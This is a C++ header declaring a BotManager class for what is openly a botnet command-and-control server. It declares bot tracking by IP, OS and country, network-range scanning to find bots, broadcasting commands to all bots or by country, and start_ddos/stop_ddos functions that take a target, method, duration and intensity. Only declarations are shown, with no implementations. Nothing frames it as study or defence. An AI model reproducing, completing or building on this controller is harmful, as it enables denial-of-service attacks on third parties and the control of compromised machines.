#ifndef BOT_MANAGER_H
#define BOT_MANAGER_H

#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <mutex>
#include <map>
#include <unordered_set>
#include <ctime>    // FIX: added for time_t

class BotManager {
public:
    struct Bot {
        std::string id;
        std::string ip;
        int port;
        std::string version;
        std::string os;
        std::string country;
        time_t last_seen;
        bool active;
        int packets_sent;
        int bytes_sent;
    };

private:
    std::vector<Bot> bots;
    std::mutex bots_mutex;
    std::atomic<bool> running;

    // Command and control
    std::string c2_server;
    int c2_port;
    std::thread c2_thread;

    // Statistics
    std::atomic<int> total_bots;
    std::atomic<int> active_bots;
    std::atomic<long long> total_packets;
    std::atomic<long long> total_bytes;
    std::atomic<bool> stopping;

    // Bot communication
    bool send_command(const Bot& bot, const std::string& command);
    std::string receive_response(const Bot& bot);
    bool validate_bot(const std::string& ip, int port);
    void broadcast(const std::string& command);

    // C2 server
    void start_c2_server();
    void handle_bot_connection(int client_socket, const std::string& client_ip);

    // Private data members
    int bot_timeout;
    std::unordered_set<std::string> banned_ips;
    std::map<std::string, int> bot_sockets;  // ip -> socket fd
    std::mutex sockets_mutex;

public:
    BotManager();
    ~BotManager();

    // Bot management
    bool add_bot(const std::string& ip, int port);
    bool add_bot(const std::string& ip, int port, bool skip_validate);
    bool remove_bot(const std::string& id);
    bool update_bot(const std::string& id, const std::string& ip, int port);

    // Bot discovery
    void scan_network(const std::string& network, int port);
    void scan_range(const std::string& start_ip, const std::string& end_ip, int port);

    // Persistence
    bool save_bots(const std::string& filename);
    bool load_bots(const std::string& filename);

    // Command execution
    void send_command_to_all(const std::string& command);
    void send_command_to_bot(const std::string& id, const std::string& command);
    void send_command_to_country(const std::string& country, const std::string& command);

    // Attack coordination
    void start_ddos(const std::string& target, int port, const std::string& method,
                    int duration, int intensity);
    void stop_ddos();

    // Statistics
    std::map<std::string, int> get_bot_stats();
    std::map<std::string, int> get_country_stats();
    std::map<std::string, int> get_os_stats();

    // Configuration
    void set_c2_server(const std::string& server, int port);
    void set_bot_timeout(int seconds);

    // Utility
    std::vector<Bot> get_all_bots();
    std::vector<Bot> get_active_bots();
    std::vector<Bot> get_bots_by_country(const std::string& country);
    int bot_count() const;
    int active_bot_count() const;
    int connected_count();
};

#endif // BOT_MANAGER_H
